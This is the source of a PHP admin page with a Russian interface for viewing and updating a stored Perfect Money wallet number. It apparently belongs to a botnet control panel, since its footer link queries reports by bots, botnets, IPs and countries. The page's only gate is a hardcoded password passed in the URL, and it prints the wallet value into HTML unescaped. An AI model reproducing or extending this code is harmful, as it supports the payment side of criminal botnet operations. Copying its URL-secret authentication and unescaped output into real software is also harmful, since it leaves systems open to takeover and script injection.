<html>
    <head>  
    
    <meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  
 <title>Perfect Money</title>
    
     <style type="text/css"> html, body {
     background: white; 
     background-attachment: fixed; 
     background-repeat: no-repeat; 
     background-position: top center;}

       </style>
     
    </head>
 <body>
  <div align="left" ><img src="images/pm.png" width=245 /></div>
<br>
<?php
$result='';
if($_GET['login']==="perfectmoneyperfect")
{

include('system/config.php');
mysql_connect($config['mysql_host'], $config['mysql_user'], $config['mysql_pass']) or die("LOL"); 
mysql_select_db($config['mysql_db']) or die("LOL");
    if(empty($_POST))
	    {
	    
		    if(isset($_GET['ok']))
	            {
		            $result = "Кошелёк обновлен!";	
		        }
		    if(isset($_GET['error']))
	            {
		            $result = "Длина кошелька не верная.";	
		        }
		    $sql_pm = "SELECT `pm` FROM `perfect` WHERE 1";
			$sql_pm_go = mysql_query($sql_pm);
			$pm_array = mysql_fetch_row($sql_pm_go);
			if($pm_array === false )
			    {
				    $pm = "RU400000000";
					
				    $pre_pm = "INSERT INTO `perfect` (`pm`) VALUES ('$pm')";
					$pre_pm_go = mysql_query($pre_pm);
				}
			    else
				{
				    $pm = $pm_array[0];
				}


		    $form = "
			         <form method='post' action='pm.php?login=perfectmoneyperfect'> 
			      
					<font color='#000000'><b>Номер счёта:</b></font>
					 <input type='text' name='pm' size='15' maxlength='11' value='$pm'>
					 <br><br>
					 <input name='Submit' type=submit size='width:100px' value='Сохранить'>
					 <br>
			         <div><font color='#00000'>$result</font></div>
			         
			         
                     </form>";
                   
			echo $form;
		}
		else
		{		
		    $sql_pm = "SELECT `pm` FROM `perfect` WHERE 1";
			$sql_pm_go = mysql_query($sql_pm);
			$pm_array = mysql_fetch_row($sql_pm_go);
            $pm_do = $pm_array[0];			
		
		 
		    $pm = mysql_real_escape_string($_POST['pm']);
			
			if(strlen($pm) === 11)
			    {
			}
			else
			{
			 header("Location: pm.php?login=perfectmoneyperfect&error=1");
			 exit;
			}
			
				
			$up_pm = "UPDATE `perfect` SET `pm`='$pm' WHERE  `pm`='$pm_do'  LIMIT 1;";
			$up_go = mysql_query($up_pm);
			header("Location: pm.php?login=perfectmoneyperfect&ok=1");
		}
		 
}
else{echo "<font color='red'><b>Не авторизирован</b></font>", "<BR>","<BR>","<BR>" ;}
$f
?>
<br>
<div align="left" ><img src="images/pmchk.png" width=245 /></div>
<br>
<div align="left" ><a href="mtanqste.php?rm=0&m=reports_db&date1=010112&date2=121213&bots=&botnets=&ips=&countries=&q=<?php echo $pm; ?>&blt=0" target="blank"><font color='#000000'><b>Check Perfect Money</b></font></a></div>

</body>
</html>
